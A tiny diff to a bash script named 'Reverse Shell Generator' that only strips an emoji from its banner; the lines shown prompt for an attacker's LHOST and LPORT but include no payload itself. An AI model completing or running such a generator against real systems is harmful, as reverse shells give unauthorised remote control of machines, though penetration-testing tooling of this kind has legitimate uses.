@@ -1,5 +1,5 @@
 #!/bin/bash
-echo "🧬 Reverse Shell Generator"
+echo "Reverse Shell Generator"
 
 read -p "Enter LHOST (your IP): " lhost
 read -p "Enter LPORT (your listening port): " lport
